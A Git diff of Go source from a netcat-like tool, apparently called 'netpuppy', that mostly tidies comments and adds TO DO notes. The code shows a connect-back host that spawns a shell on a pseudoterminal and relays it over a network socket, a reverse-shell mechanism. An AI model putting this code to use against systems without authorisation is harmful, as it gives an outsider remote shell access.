@@ -42,11 +42,7 @@ type ConnectBackHost struct {
 }
 
 func NewHost(peer *conn.Peer, c conn.ConnectionGetter) (Host, error) {
-	fmt.Printf("NEW HOST PEER: %v\n", peer)
-	// Based on the connection type requested by user,
-	// get the socket:
-	// var conn.ConnectionGetter
-
+	// Based on the connection type requested by the user:
 	switch peer.ConnectionType {
 	case "offense":
 		socket, err := c.GetConnectionFromListener(peer.LPort, peer.Address, peer.Shell)
@@ -176,6 +172,8 @@ func (off *OffensiveHost) Start(pCtx context.Context) (error, int) {
 	// Call wait after go routines b/c it's going to block:
 	wg.Wait()
 
+	//..........
+	//.... TO DO
 	// SINCE WE'RE DYING, LETS TELL THE OTHER HOST:
 	// signal := "tiddies"
 
@@ -183,6 +181,8 @@ func (off *OffensiveHost) Start(pCtx context.Context) (error, int) {
 	// if err != nil {
 	// 	fmt.Printf("ERROR SENDING TIDDIES SIGNAL: %v\n", err)
 	// }
+	//.... </TD>
+	//..........
 
 	errno = ioctl.DisableRawMode(int(off.stdin.Fd()), oGTermios)
 	if errno != 0 {
@@ -219,7 +219,8 @@ func (off *OffensiveHost) Start(pCtx context.Context) (error, int) {
 
 func (cb *ConnectBackHost) Start(pCtx context.Context) (error, int) {
 	var errorCount int
-	// PTS and MAster
+
+	// Get pseudoterminal device files
 	master, pts, err := pty.GetPseudoterminalDevices()
 	if err != nil {
 		return err, errorCount
@@ -249,7 +250,7 @@ func (cb *ConnectBackHost) Start(pCtx context.Context) (error, int) {
 	cb.shell.Stdout = pts
 	cb.shell.Stderr = pts
 
-	// Start Shell:
+	// Start shell:
 	err = cb.shell.Start()
 	if err != nil {
 		return err, errorCount
@@ -259,7 +260,7 @@ func (cb *ConnectBackHost) Start(pCtx context.Context) (error, int) {
 	childContext, chCancel := context.WithCancel(pCtx)
 	defer chCancel()
 
-	// Make waitgroups
+	// Make waitgroups:
 	var wg sync.WaitGroup
 	wg.Add(2)
 
@@ -276,7 +277,7 @@ func (cb *ConnectBackHost) Start(pCtx context.Context) (error, int) {
 				fmt.Printf("child context done in connect back go routine\n")
 				return
 			default:
-				// Read from socket
+				// Read from socket:
 				socketContent, puppies_on_the_storm_if_give_this_puppy_ride_sweet_netpuppy_will_die := cb.socket.Read() // @arthvadrr 'err'
 				if puppies_on_the_storm_if_give_this_puppy_ride_sweet_netpuppy_will_die != nil {
 					if errors.Is(puppies_on_the_storm_if_give_this_puppy_ride_sweet_netpuppy_will_die, io.EOF) {
@@ -284,7 +285,7 @@ func (cb *ConnectBackHost) Start(pCtx context.Context) (error, int) {
 						//... try to send something?
 						_, err := cb.socket.WriteShit([]byte("hello?"))
 						if err != nil {
-							// Socket probs dead? time to quit
+							// Socket probs dead? time to quit:
 							fmt.Printf("Error when checking socket connection, might be dead: %v\n", err)
 							stopSigChan <- true
 							return
@@ -304,7 +305,7 @@ func (cb *ConnectBackHost) Start(pCtx context.Context) (error, int) {
 					return
 				}
 
-				// Write to master device
+				// Write to master device:
 				_, err := master.Write(socketContent)
 				if err != nil {
 					fmt.Printf("Error writing to master device: %v\n", err)
@@ -315,11 +316,11 @@ func (cb *ConnectBackHost) Start(pCtx context.Context) (error, int) {
 		}
 	}()
 
-	go func() { // Reading master device and writing output to socket
+	go func() { // Reading master device and writing output to socket:
 		defer wg.Done()
 		defer chCancel()
 
-		// Read from master device into buffer
+		// Read from master device into buffer:
 		buffer := make([]byte, 1024)
 		for {
 			select {
@@ -333,7 +334,6 @@ func (cb *ConnectBackHost) Start(pCtx context.Context) (error, int) {
 					return
 				}
 
-				//	If i > 0 (not EOF), Write to socket:
 				_, err = cb.socket.WriteShit(buffer[:i])
 				if err != nil {
 					fmt.Printf("Error writing shit to socket from master device: %v\n", err)
@@ -345,6 +345,14 @@ func (cb *ConnectBackHost) Start(pCtx context.Context) (error, int) {
 
 	// Call wg.Wait() to block parent context while go routines are going...
 	wg.Wait()
+
+	//..........
+	//.... TO DO
+	//     1. Need to get rid of print statements
+	//     2. Send errors down socket
+	//     3. Clean up error handling
+	//.... </TD>
+	//.........
 
 	// Once both routines are done, cleanup:
 	// close pts and master devices:
